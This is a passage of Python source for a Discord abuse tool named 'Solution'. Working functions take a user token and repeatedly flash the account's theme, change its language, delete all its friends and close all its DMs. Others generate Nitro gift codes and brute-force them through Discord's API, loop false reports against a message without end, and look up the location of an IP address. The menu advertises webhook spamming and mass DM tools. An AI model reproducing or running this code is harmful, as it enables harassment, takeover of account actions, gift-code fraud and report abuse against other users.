            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Sleeping {retryafter}ms")
            time.sleep(2)
            menu
        elif r.status_code == 200:
            PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► [SUCCESS] Successfully changed Status!")
            time.sleep(2)
            menu()
        else:
            print(r.status_code)
            print(r.text)
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Some weird error idk contact Nico.#1559 on discord")
            time.sleep(2)
            input()
            menu()
    except KeyboardInterrupt:
        menu()
def loopedtokenstatuschanger():
    try:
        rpc.update(state="Looping The Status Changer🌌",details=f"{version} ~ Dev: Nico.#1559",large_image = 'solutionpb',buttons=[{"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}],start=dsctime)
    except:
        pass
    token = input(f"{fblue}╔════[Enter Token]\n╚══► {cyan}")
    status = input(f"{fblue}╔════[Enter Statuses To loop (cut them with , )]\n╚══► {cyan}")
    delay = int(input(f"{fblue}╔════[Enter Delay in s ~ lowest 0s]\n╚══► {cyan}"))
    lmao = status.split(",")
    statuses = []
    for split in lmao:
        statuses.append(split)
    print(statuses)
    try:
        while True:
            for lmao in statuses:
                json = {"custom_status": {"text": lmao, "emoji_name": "🌌"}}
                r = requests.patch("https://discord.com/api/v8/users/@me/settings", headers={"Authorization": token}, json=json)
                if r.status_code == 429:
                    dataload = r.json()
                    retryafter = dataload['retry_after']
                    PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Sleeping {retryafter}ms")
                    time.sleep(retryafter/10000)
                elif r.status_code == 200:
                    PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► [SUCCESS] Successfully changed Status to '{lmao}'")
                    time.sleep(delay)
                else:
                    print(r.status_code)
                    print(r.text)
                    PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Some weird error idk contact Nico.#1559 on discord")
                    time.sleep(2)
                    input()
                    menu()
    except KeyboardInterrupt:
        menu()
def tokenchangelanguage():
    try:
        rpc.update(state="Changing Someones Language😂", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
               {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    token = input(f"{fblue}╔════[Enter Delay in s ~ lowest 0s]\n╚══► {cyan}")
    headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
            }
    locales = [
            "da", "de",
            "en-GB", "en-US",
            "es-ES", "fr",
            "hr", "it",
            "lt", "hu",
            "nl", "no",
            "pl", "pt-BR",
            "ro", "fi",
            "sv-SE", "vi",
            "tr", "cs",
            "el", "bg",
            "ru", "uk",
            "th", "zh-CN",
            "ja", "zh-TW",
            "ko"
        ]
    setting = {'locale': random.choice(locales)}
    try:
        while True:
            try:
                r = requests.patch('https://discord.com/api/v8/users/@me/settings',headers=headers,json=setting)
                if r.status_code == 429:
                    dataload = r.json()
                    retryafter = dataload['retry_after']
                    PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Sleeping {retryafter}ms")
                    time.sleep(retryafter/10000)
                elif r.status_code == 200:
                    PrintLinearGradient("#0400ff", "#00ffdd",f"╚══► [SUCCESS] Successfully Changed Language.")
                else:
                    print(r.status_code)
                    print(r.text)
                    PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Some weird error idk contact Nico.#1559 on discord")
                    time.sleep(2)
                    input()
                    menu()
            except KeyboardInterrupt:
                menu()
    except KeyboardInterrupt:
        menu()
def tokenlightdark():
    try:
        rpc.update(state="Flashing Someones Screen😂",details=f"{version} ~ Dev: Nico.#1559",large_image = 'solutionpb',buttons=[{"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}],start=dsctime)
    except:
        pass
    token = input(f"{fblue}╔════[Enter Token]\n╚══► {cyan}")
    headers = {
            'Authorization': token,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.309 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36'
            }
    mod = cycle(["light", "dark"])
    try:
        while True:
            settings = {'theme': next(mod)}
            r = requests.patch('https://discord.com/api/v8/users/@me/settings',headers=headers,json=settings)
            if r.status_code == 429:
                dataload = r.json()
                retryafter = dataload['retry_after']
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Sleeping {retryafter}ms")
                time.sleep(retryafter/10000)
            elif r.status_code == 200:
                PrintLinearGradient("#0400ff", "#00ffdd",f"╚══► [SUCCESS] Successfully Changed Appearence Mode.")
            else:
                print(r.status_code)
                print(r.text)
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Some weird error idk contact Nico.#1559 on discord")
                time.sleep(2)
                input()
                menu()
    except KeyboardInterrupt:
        menu()
def tokenfriendremove():
    counted = 0
    xl = 0
    try:
        rpc.update(state="Deleting Friends🌌",details=f"{version} ~ Dev: Nico.#1559",large_image = 'solutionpb',buttons=[{"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}],start=dsctime)
    except:
        pass
    try:
        token = input(f"{fblue}╔════[Enter Token]\n╚══► {cyan}")
        headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
        r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
        if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
        else:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Invalid Token!")
            time.sleep(2)
            menu()
    except Exception as e:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] {e}")
        time.sleep(2)
        menu()
    ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName}')
    remove_friends_request = requests.get("https://canary.discord.com/api/v8/users/@me/relationships", headers=headers).json()
    for i in remove_friends_request:
        counted += 1
    ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName} | Friends Loaded: {counted}')
    for i in remove_friends_request:
        x = requests.delete(f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}", headers=headers)
        if x.status_code == 204:
            PrintLinearGradient("#0400ff", "#00ffdd",f"╚══► [SUCCESS] Successfully Removed {i['id']}.")
            xl += 1
            ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName} | Friends Removed: {xl}/{counted}')
        elif r.status_code == 429:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Change VPN Sleeping 30s")
            time.sleep(30)
        else:
            print(r.status_code)
            print(r.text)
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Some weird error idk contact Nico.#1559 on discord")
            time.sleep(2)
            input()
            menu()
    menu()
def deldms():
    try:
        rpc.update(state="Deleting DMs⚙",details=f"{version} ~ Dev: Nico.#1559",large_image = 'solutionpb',buttons=[{"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}],start=dsctime)
    except:
        pass
    xl = 0
    removed = 0
    try:
        token = input(f"{fblue}╔════[Enter Token]\n╚══► {cyan}")
        headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
        r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
        if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
        else:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Invalid Token!")
            time.sleep(2)
            menu()
    except Exception as e:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] {e}")
        time.sleep(2)
        menu()
    ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName}')
    close_dm_request = requests.get("https://canary.discord.com/api/v8/users/@me/channels", headers=headers).json()
    for x in close_dm_request:
        xl += 1
    ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName} | Loaded: {xl}')
    for channel in close_dm_request:
        x = requests.delete(f"https://canary.discord.com/api/v8/channels/{channel['id']}",headers=headers)
        if x.status_code == 200:
            removed += 1
            PrintLinearGradient("#0400ff", "#00ffdd",f"╚══► [SUCCESS] Successfully Closed {channel['id']}.")
            
        elif x.status_code == 429:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Change VPN Sleeping 30s")
            time.sleep(30)
        else:
            print(r.status_code)
            print(r.text)
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Some weird error idk contact Nico.#1559 on discord")
            time.sleep(2)
            input()
            menu()
        ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName} | Removed: {removed}/{xl}')
    menu()
def nitrogen():
    amount = input(f"{fblue}╔════[Enter Amount]\n╚══► {cyan}")
    gentime = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    generated = 0
    for x in range(int(amount)):
        code = ('').join(random.choices(string.ascii_letters + string.digits, k=16))
        y = open(f"output/gen_nitro_codes[{gentime}].txt", "a")
        y.write(f"discord.gift/{code}\n")
        y.close()
        generated += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f"🪐Solution | Nitro Codes Generated: {generated} ")
        try:
            rpc.update(state=f"Generated {generated} Code/s", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
               {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
        except:
            pass
    PrintLinearGradient("#0400ff", "#00ffdd",f"╚══► [SUCCESS] Successfully Generated {amount} Code/s.")
    time.sleep(2)
    menu()
def nitrochecker():
    global listlength, valid, invalid, error
    xd = []
    try:
        rpc.update(state=f"Checking Nitro🌌", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
               {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    list = input(f"{fblue}╔════[Enter Nitro Code List]\n╚══► {cyan}")
    xl = open(list, "r").read().splitlines()
    for line in xl:
        listlength += 1
        xd.append(line)
    PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► Successfully Loaded {listlength} Code/s.")
    try:
        for code in xd:
            code = code.split("/")[-1]
            r = requests.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true")
            if r.status_code == 200:
                valid += 1
            elif r.status_code == 429:
                data = r.json()
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Sleeping {data['retry_after']}ms")
                error += 1
                try:
                    checked = valid+invalid
                    progx = checked / listlength * 100
                    progy = (str(float(progx)))
                    progress = progy[0:5]
                except:
                    progress = 0
                ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Progress: {progress}% | Ratio: 1:4.7672402e+28 | Checked Nitro {invalid+valid}/{listlength} | Valid: {valid} | Invalid: {invalid}')
            
                time.sleep(data['retry_after']/1000)
            else:
                PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► [INVALID] discord.gift/{code}")
                invalid += 1
                try:
                    checked = valid+invalid
                    progx = checked / listlength * 100
                    progy = (str(float(progx)))
                    progress = progy[0:5]
                except:
                    progress = 0
                ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Progress: {progress}% | Ratio: 1:4.7672402e+28 | Checked Nitro {invalid+valid}/{listlength} | Valid: {valid} | Invalid: {invalid}')
            try:
                checked = valid+invalid
                progx = checked / listlength * 100
                progy = (str(float(progx)))
                progress = progy[0:5]
            except:
                progress = 0
            ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Progress: {progress}% | Ratio: 1:4.7672402e+28 | Checked Nitro {invalid+valid}/{listlength} | Valid: {valid} | Invalid: {invalid}')
            try:
                rpc.update(state=f"Checked {valid+invalid}/{listlength} Nitro", details="v1.0 ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
                {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
            except:
                pass
        menu()
    except KeyboardInterrupt:
        menu()
def NitroGenAndCheck():
    global listlength, valid, invalid, error
    try:
        rpc.update(state=f"Checking Nitro🌌", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
               {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    list = input(f"{fblue}╔════[Enter Amount To Check]\n╚══► {cyan}")
    try:
        for x in range(int(list)):
            code = ('').join(random.choices(string.ascii_letters + string.digits, k=16))
            r = requests.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true")
            if r.status_code == 200:
                valid += 1
            elif r.status_code == 429:
                data = r.json()
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Ratelimited! Sleeping {data['retry_after']}ms")
                error += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Ratio: 1:4.7672402e+28 | Checked Nitro {invalid+valid} | Valid: {valid} | Invalid: {invalid}')
                time.sleep(data['retry_after']/1000)
            else:
                PrintLinearGradient("#0400ff", "#00ffdd", f"╚══► [INVALID] discord.gift/{code}")
                invalid += 1
                ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Ratio: 1:4.7672402e+28 | Checked Nitro {invalid+valid} | Valid: {valid} | Invalid: {invalid}')

            ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Ratio: 1:4.7672402e+28 | Checked Nitro {invalid+valid} | Valid: {valid} | Invalid: {invalid}')
            try:
                rpc.update(state=f"Checked {valid+invalid} Nitro", details="v1.0 ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
                {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
            except:
                pass
        menu()
    except KeyboardInterrupt:
        menu()
def reportbot():
    try:
        rpc.update(state=f"Running Report Bot🌌", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
                {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    sent = 0
    try:
        token = input(f"{fblue}╔════[Enter Token]\n╚══► {cyan}")
        headerss = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
        r = requests.get('https://discord.com/api/v6/users/@me', headers=headerss)
        if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
        else:
            PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Invalid Token!")
            time.sleep(2)
            menu()
    except Exception as e:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] {e}")
        time.sleep(2)
        menu()
    ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName}')
    serverid = input(f"{fblue}╔════[Enter Server ID]\n╚══► {cyan}")
    channelid = input(f"{fblue}╔════[Enter Channel ID]\n╚══► {cyan}")
    messageid = input(f"{fblue}╔════[Enter Message ID]\n╚══► {cyan}")
    reasonid = input(f"{fblue}╔════[Enter Reason]\n╚══► {cyan}")
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
        'Authorization': token,
        'Content-Type': 'application/json'}
    payload = {
    'channel_id': channelid,
    'guild_id': serverid,
    'message_id': messageid,
    'reason': reasonid}
    try:
        while True:
            try:
                r = requests.post('https://discord.com/api/v6/report', headers=headers, json=payload)
                if r.status_code == 201:
                    reportid = r.json()
                    sent += 1
                    ctypes.windll.kernel32.SetConsoleTitleW(f'🪐Solution | Connected ~> {userName} | Reports Sent: {sent}')
                    PrintLinearGradient("#0400ff", "#00ffdd",f"╚══► [SUCCESS] Successfully Reported > Report ID: {reportid['id']} ({sent})")
                elif r.status_code == 401:
                    PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Invalid Token!")
                    input()
                    exit()
                else:
                    print(r.status_code)
                    print(r.text)
                    PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Some weird error idk contact Nico.#1559 on discord")
                    time.sleep(2)
                    input()
                    menu()
            except KeyboardInterrupt:
                menu()
            except Exception as e:
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] {e}")
    except KeyboardInterrupt:
        menu()
    except Exception as e:
        PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] {e}")
        
def printlogo():
    try:
        os.mkdir("output")
    except:
        pass
    try:
        os.system("cls")
    except:
        os.system("clear")
    print(logo_layer0)
    PrintLinearGradient("#0400ff", "#00ffdd", logo_layer1)
    PrintLinearGradient("#0400ff", "#00ffdd", logo_layer2)
    PrintLinearGradient("#0400ff", "#00ffdd", logo_layer3)
    PrintLinearGradient("#0400ff", "#00ffdd", logo_layer4)
    PrintLinearGradient("#0400ff", "#00ffdd", logo_layer5)
    PrintLinearGradient("#0400ff", "#00ffdd", logo_layer6)
    PrintLinearGradient("#0400ff", "#00ffdd", logo_layer7)

def menu():
    try:
        rpc.update(state="🌌Menu", details=f"{version} ~ Dev: Nico.#1559", large_image='solutionpb', buttons=[
               {"label": "Discord", "url": "https://discord.gg/T37sCUVgS6"}], start=dsctime)
    except:
        pass
    resetvalues()
    global allowthreading
    allowthreading = False
    printlogo()
    ctypes.windll.kernel32.SetConsoleTitleW(f"🪐Solution | User: [{username}] | Expiry: [{expiryremaining} Day/s] | Account Type: [{userrank}]")
    PrintLinearGradient("#0400ff", "#00ffdd","║ [1]  Webhook Spammer   [11] Token Status      ║")
    PrintLinearGradient("#0400ff", "#00ffdd","║ [2]  Webhook Deleter   [12] Token LangChanger ║")
    PrintLinearGradient("#0400ff", "#00ffdd","║ [3]  Invite Generator  [13] Token Light&Dark  ║")
    PrintLinearGradient("#0400ff", "#00ffdd","║ [4]  Invite Checker    [14] Token F-remove    ║")
    PrintLinearGradient("#0400ff", "#00ffdd","║ [5]  Token Checker     [15] Token Close AllDM ║")
    PrintLinearGradient("#0400ff", "#5effea","║ [6]  Token Joiner      [16] Nitro-Generator   ║")
    PrintLinearGradient("#0400ff", "#00ffdd","║ [7]  Token Leaver      [17] Nitro-Checker     ║")
    PrintLinearGradient("#0400ff", "#00ffdd","║ [8]  Token Login       [18] Report Bot        ║")
    PrintLinearGradient("#0400ff", "#00ffdd","║ [9]  Token Dm-All      [19] IP Lookup         ║")
    PrintLinearGradient("#0400ff", "#00ffdd","║ [10] Token S-Create    [20] Exit              ║")
    PrintLinearGradient("#0400ff", "#00ffdd","║               [%] Join Discord                ║")
    PrintLinearGradient("#0400ff", "#00ffdd","╚══════════════✶ Made by Tooreex ✶══════════════╝")
    try:
        choice = input(f"\n{fblue}╔════[root@solution]\n╚══► {cyan}")
    except ValueError:
        PrintLinearGradient("#0400ff", "#00ffdd", "[Δ] Invalid Number!")
        time.sleep(1.5)
        return menu()
    except KeyboardInterrupt:
        try:
            print(reset)
            os.system("cls")
            os._exit(1)
            exit()
        except:
            print(reset)
            os.system("clear")
            os._exit(1)
            exit()
    except Exception as e:
        PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] {e}!")
        time.sleep(1.5)
        return menu()
    if choice == "1":
        try:
            webhookspammer()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu()
    elif choice == "2":
        try:
            webhookdeleter()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu()
    elif choice == "3":
        try:
            invitegen()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu()
    elif choice == "4":
        try:
            invitechecker()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu()
    elif choice == "5":
        try:
            tokenchecker()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu()
    elif choice == "6":
        try:
            os.system("cls")
        except:
            os.system("clear")
        try:
            print(logo_layer0)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer1)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer2)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer3)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer4)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer5)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer6)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer7)
            PrintLinearGradient("#0400ff", "#00ffdd","║              [1] 1-Token 1-Server             ║")
            PrintLinearGradient("#0400ff", "#00ffdd","║              [2] 1-Token Servers              ║")
            PrintLinearGradient("#0400ff", "#00ffdd","║              [3] ^ With Min/Max Members       ║")
            PrintLinearGradient("#0400ff", "#00ffdd","║              [4] Tokens 1-Servers             ║")
            PrintLinearGradient("#0400ff", "#00ffdd","║              [0] Return to menu               ║")
            PrintLinearGradient("#0400ff", "#00ffdd","╚══════════════✶ Made by Tooreex ✶══════════════╝")
            joineroption = int(input(f"\n{fblue}╔════[Enter Option]\n╚══► {cyan}"))
            try:
                if joineroption == 1:
                    onetokenoneserver()
                    menu()
                elif joineroption == 2:
                    onetokenservers()
                    menu()
                elif joineroption == 3:
                    onetokenserversratio()
                    menu()
                elif joineroption == 4:
                    tokensoneserver()
                    menu()
                elif joineroption == 0:
                    menu()
                else:
                    PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Invalid Option!")
                    time.sleep(2)
                    menu()
            except KeyboardInterrupt:
                menu()
            except Exception as e:
                print(e)
                input()
                menu()
        except KeyboardInterrupt:
            menu()
        except IndexError:
            PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] Unknown Option!")
            time.sleep(2)
            menu()
    elif choice == "7":
        try:
            os.system("cls")
        except:
            os.system("clear")
        try:
            print(logo_layer0)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer1)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer2)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer3)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer4)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer5)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer6)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer7)
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [1] 1-Token LeaveAll             ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [2] All Tokens Leave 1 Server    ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [0] Return to menu               ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "╚══════════════✶ Made by Tooreex ✶══════════════╝")
            joineroption = int(input(f"\n{fblue}╔════[Enter Option]\n╚══► {cyan}"))
            try:
                if joineroption == 1:
                    tokenleaveall()
                    menu()
                elif joineroption == 2:
                    tokenmassleaver()
                    menu()
                elif joineroption == 0:
                    menu()
                else:
                    PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] Invalid Option!")
                    time.sleep(2)
                    menu()
            except KeyboardInterrupt:
                menu()
            except Exception as e:
                print(e)
                input()
                menu()
        except KeyboardInterrupt:
            menu()
        except IndexError:
            PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] Unknown Option!")
            time.sleep(2)
            menu()
    elif choice == "8":
        try:
            tokenlogin()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu()
    elif choice == "9":
        try:
            tokendmall()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu()
    elif choice == "10":
        try:
            tokenservercreate()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu()
    elif choice == "11":
        try:
            os.system("cls")
        except:
            os.system("clear")
        try:
            print(logo_layer0)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer1)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer2)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer3)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer4)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer5)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer6)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer7)
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [1] Change Status to             ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [2] Looped Status Changing       ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [0] Return to menu               ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "╚══════════════✶ Made by Tooreex ✶══════════════╝")
            joineroption = int(input(f"\n{fblue}╔════[Enter Option]\n╚══► {cyan}"))
            try:
                if joineroption == 1:
                    tokenstatuschanger()
                    menu()
                elif joineroption == 2:
                    loopedtokenstatuschanger()
                    menu()
                elif joineroption == 0:
                    menu()
                else:
                    PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] Invalid Option!")
                    time.sleep(2)
                    menu()
            except KeyboardInterrupt:
                menu()
            except Exception as e:
                print(e)
                input()
                menu()
        except KeyboardInterrupt:
            menu()
        except IndexError:
            PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] Unknown Option!")
            time.sleep(2)
            menu()
    elif choice == "12":
        try:
            tokenchangelanguage()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu() 
    elif choice == "13":
        try:
            tokenlightdark()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu() 
    elif choice == "14":
        try:
            tokenfriendremove()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu() 
    elif choice == "15":
        try:
            deldms()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu()
    elif choice == "16":
        try:
            nitrogen()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu()
    elif choice == "17":
        try:
            os.system("cls")
        except:
            os.system("clear")
        try:
            print(logo_layer0)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer1)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer2)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer3)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer4)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer5)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer6)
            PrintLinearGradient("#0400ff", "#00ffdd", logo_layer7)
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [1] Check from List              ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [2] Generate & Check             ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [0] Return to menu               ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "╚══════════════✶ Made by Tooreex ✶══════════════╝")
            joineroption = int(input(f"\n{fblue}╔════[Enter Option]\n╚══► {cyan}"))
            try:
                if joineroption == 1:
                    nitrochecker()
                    menu()
                elif joineroption == 2:
                    NitroGenAndCheck()
                    menu()
                elif joineroption == 0:
                    menu()
                else:
                    PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] Invalid Option!")
                    time.sleep(2)
                    menu()
            except KeyboardInterrupt:
                menu()
            except Exception as e:
                print(e)
                input()
                menu()
        except KeyboardInterrupt:
            menu()
        except IndexError:
            PrintLinearGradient("#0400ff", "#00ffdd", f"[Δ] Unknown Option!")
            time.sleep(2)
            menu()
    elif choice == "18":
        try:
            printlogo()
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [1] Illegal Content              ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [2] Harassment                   ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [3] Spam or Phishing Links       ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [4] Self Harm                    ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "║              [0] Return to menu               ║")
            PrintLinearGradient("#0400ff", "#00ffdd", "╚══════════════✶ Made by Tooreex ✶══════════════╝")
            reportbot()
            menu()
        except KeyboardInterrupt:
            menu()
        except Exception as e:
            print(e)
            input()
            menu()
    elif choice == "19":
        try:
            ip = input(f"{fblue}╔════[Enter IP]\n╚══► {cyan}")
            getinfo = requests.get(f"http://ipinfo.io/{ip}/json")
            if '"status": 404' in getinfo.text:
                PrintLinearGradient("#0400ff", "#00ffdd",f"[Δ] Invalid IP!")
                time.sleep(2)
                menu()
            data = getinfo.json()
            maxlen = 37
            ipbars = " "*(maxlen-len(data['ip']))
            citybars = " "*(maxlen-len(data['city']))
            regionbars = " "*(maxlen-len(data['region']))
            countrybars = " "*(maxlen-len(data['country']))
            locbars = " "*(maxlen-len(data['loc']))
            orgbars = " "*(maxlen-len(data['org']))
            postalbars = " "*(maxlen-len(data['postal']))
            timezonebars = " "*(maxlen-len(data['timezone']))
            printlogo()
            PrintLinearGradient("#0400ff", "#00ffdd", f"║IP:       {data['ip']}{ipbars}║")
            PrintLinearGradient("#0400ff", "#00ffdd", f"║City:     {data['city']}{citybars}║")
            PrintLinearGradient("#0400ff", "#00ffdd", f"║Region:   {data['region']}{regionbars}║")
            PrintLinearGradient("#0400ff", "#00ffdd", f"║Country:  {data['country']}{countrybars}║")
            PrintLinearGradient("#0400ff", "#00ffdd", f"║Loc:      {data['loc']}{locbars}║")
            PrintLinearGradient("#0400ff", "#00ffdd", f"║Org:      {data['org']}{orgbars}║")
            PrintLinearGradient("#0400ff", "#00ffdd", f"║Postal:   {data['postal']}{postalbars}║")
            PrintLinearGradient("#0400ff", "#00ffdd", f"║Timezone: {data['timezone']}{timezonebars}║")
            PrintLinearGradient("#0400ff", "#00ffdd", f"║                                               ║")
            PrintLinearGradient("#0400ff", "#00ffdd", f"╚══════════════✶ Made by Tooreex ✶══════════════╝")
